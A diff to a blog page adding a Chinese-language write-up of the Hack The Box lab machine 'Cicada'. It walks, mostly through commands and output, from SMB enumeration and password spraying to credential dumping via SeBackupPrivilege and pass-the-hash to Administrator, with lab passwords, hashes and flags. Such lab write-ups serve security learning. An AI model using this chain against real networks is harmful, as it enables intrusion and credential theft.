@@ -140,7 +140,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -163,6 +163,285 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/10/07/Cicada/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xu Haoxiang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eur3ka's Studio">
+      <meta itemprop="description" content="Never again.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Eur3ka's Studio">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/10/07/Cicada/" class="post-title-link" itemprop="url">Cicada</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-10-07 23:12:25" itemprop="dateCreated datePublished" datetime="2025-10-07T23:12:25+08:00">2025-10-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-10-08 22:13:44" itemprop="dateModified" datetime="2025-10-08T22:13:44+08:00">2025-10-08</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><p>初步嗅探发现开了好多端口 看这架势后期肯定是域渗透没跑了</p>
+<pre><code>❯ sudo nmap  10.10.11.35
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-07 23:10 +0800
+Nmap scan report for 10.10.11.35 (10.10.11.35)
+Host is up (0.30s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman
+
+Nmap done: 1 IP address (1 host up) scanned in 20.28 seconds
+</code></pre>
+<p>发现开着445端口 说明SMB服务是有的 稍微嗅探一下看看有什么</p>
+<pre><code>❯ smbutil view -G //10.10.11.35
+Password for 10.10.11.35:
+Share                                           Type    Comments
+-------------------------------
+ADMIN$                                          Disk    Remote Admin
+SYSVOL                                          Disk    Logon server share
+NETLOGON                                        Disk    Logon server share
+HR                                              Disk
+C$                                              Disk    Default share
+DEV                                             Disk
+IPC$                                            Pipe    Remote IPC
+
+7 shares listed
+</code></pre>
+<h1 id="Auth-as-michael-wrightson"><a href="#Auth-as-michael-wrightson" class="headerlink" title="Auth as michael.wrightson"></a>Auth as michael.wrightson</h1><p>打开HR之后 发现里面的文件写着默认密码</p>
+<pre><code>Your default password is: Cicada$M6Corpb*@Lp#nZp!8
+</code></pre>
+<p>本想使用hydra爆破一下 不知为何打不通</p>
+<pre><code>❯ hydra -L TOP用户名-管理设备分支pro.txt -P ~/Desktop/pass.txt 10.10.11.35 smb
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-08 10:46:57
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 1191 login tries (l:1191/p:1), ~1191 tries per task
+[DATA] attacking smb://10.10.11.35:445/
+[ERROR] invalid reply from target smb://10.10.11.35:445/
+</code></pre>
+<p>改为用netexec来grep一下</p>
+<pre><code>❯ netexec smb 10.10.11.35 -u &#39;guest&#39; -p &#39;&#39; --rid-brute | grep SidTypeUser
+SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
+</code></pre>
+<p>将上述用户名存为users后 用netexec可以简单遍历一下</p>
+<pre><code>❯ netexec smb 10.10.11.35 -u users -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --continue-on-success
+...
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+...
+</code></pre>
+<p>那么继续用netexec登陆到smb服务</p>
+<pre><code>❯ netexec smb 10.10.11.35 -u &#39;michael.wrightson&#39; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --shares
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+SMB         10.10.11.35     445    CICADA-DC        DEV
+SMB         10.10.11.35     445    CICADA-DC        HR              READ
+SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share
+SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
+</code></pre>
+<p>可惜相比于guest 这个人也没有其他目录权限了 尝试一下用一样的用户密码登录一下ldap</p>
+<pre><code>❯ netexec ldap 10.10.11.35 -u &#39;michael.wrightson&#39; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --users
+LDAP        10.10.11.35     389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel binding:Never)
+LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+LDAP        10.10.11.35     389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
+LDAP        10.10.11.35     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW-  -Description-
+LDAP        10.10.11.35     389    CICADA-DC        Administrator                 2024-08-27 04:08:03 1        Built-in account for administering the computer/domain
+LDAP        10.10.11.35     389    CICADA-DC        Guest                         2024-08-29 01:26:56 0        Built-in account for guest access to the computer/domain
+LDAP        10.10.11.35     389    CICADA-DC        krbtgt                        2024-03-14 19:14:10 1        Key Distribution Center Service Account
+LDAP        10.10.11.35     389    CICADA-DC        john.smoulder                 2024-03-14 20:17:29 1
+LDAP        10.10.11.35     389    CICADA-DC        sarah.dantelia                2024-03-14 20:17:29 1
+LDAP        10.10.11.35     389    CICADA-DC        michael.wrightson             2024-03-14 20:17:29 0
+LDAP        10.10.11.35     389    CICADA-DC        david.orelious                2024-03-14 20:17:29 1        Just in case I forget my password is aRt$Lp#7t*VQ!3
+LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                  2024-08-23 05:20:17 1
+</code></pre>
+<p>好家伙 你和david.orelious两个卧龙凤雏</p>
+<h1 id="Auth-as-david-orelious"><a href="#Auth-as-david-orelious" class="headerlink" title="Auth as david.orelious"></a>Auth as david.orelious</h1><p>登陆到david.orelious后 在DEV目录下找到登陆凭据</p>
+<pre><code>$sourceDirectory = &quot;C:\smb&quot;
+$destinationDirectory = &quot;D:\Backup&quot;
+
+$username = &quot;emily.oscars&quot;
+$password = ConvertTo-SecureString &quot;Q!3@Lp#M6b*7t*Vt&quot; -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+$dateStamp = Get-Date -Format &quot;yyyyMMdd_HHmmss&quot;
+$backupFileName = &quot;smb_backup_$dateStamp.zip&quot;
+$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host &quot;Backup completed successfully. Backup file saved to: $backupFilePath&quot;
+</code></pre>
+<h1 id="Shell-as-emily-oscars"><a href="#Shell-as-emily-oscars" class="headerlink" title="Shell as emily.oscars"></a>Shell as emily.oscars</h1><p>比较简单的登陆后拿到flag</p>
+<pre><code>❯ evil-winrm -i 10.10.11.35 -u &#39;emily.oscars&#39; -p &#39;Q!3@Lp#M6b*7t*Vt&#39;
+
+Evil-WinRM shell v3.7
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; cat ../Desktop/user.txt
+7ef56cd3f4402a0a2c8d01ebe4bd2d7e
+</code></pre>
+<h1 id="Shell-as-system"><a href="#Shell-as-system" class="headerlink" title="Shell as system"></a>Shell as system</h1><pre><code>Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
+   at System.Management.ThreadDispatch.Start()
+   at System.Management.ManagementScope.Initialize()
+   at System.Management.ManagementObjectSearcher.Initialize()
+   at System.Management.ManagementObjectSearcher.Get()
+   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)
+</code></pre>
+<p>试着上传winpeas 但是好像卡着没反应 也许和权限有关系? 那就换个思路好了</p>
+<pre><code>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; net user emily.oscars
+User name                    emily.oscars
+Full Name                    Emily Oscars
+...
+Local Group Memberships      *Backup Operators     *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+</code></pre>
+<p>发现有<code>*Backup Operators</code>组 那再顺理成章找一下权限</p>
+<pre><code>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre>
+<p>不错 有发现SeBackupPrivilege 那么导出一下注册表文件</p>
+<pre><code>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; reg save hklm\sam sam
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; reg save hklm\system system
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; download sam
+
+Info: Downloading C:\Users\emily.oscars.CICADA\Documents\sam to sam
+
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; download system
+
+Info: Downloading C:\Users\emily.oscars.CICADA\Documents\system to system
+
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt;
+</code></pre>
+<p>接下来使用impacket的secretsdump.py成功导出哈希</p>
+<pre><code>❯ secretsdump.py -sam sam -system system local
+/Users/joe/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+  import pkg_resources
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#39;t have hash information.
+[*] Cleaning up...
+</code></pre>
+<p>接下来使用netexec测试哈希加evil-winrm连接一条龙 注意用的哈希格式不一样 总的来说还是非常方便的</p>
+<pre><code>❯ netexec smb 10.10.11.35 -u &#39;Administrator&#39; -H aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341
+
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
+
+//中间重启过一次iterm2 不重启连不上 可能是缓存原因?
+
+❯ evil-winrm -i cicada.htb -u &#39;administrator&#39; -H &#39;2b87e7c93a3e8a0ea4a581937016f341&#39;
+
+Evil-WinRM shell v3.7
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cat ../Desktop/root.txt
+f9d5971cf39be80c31df7e52ddfcdd83
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
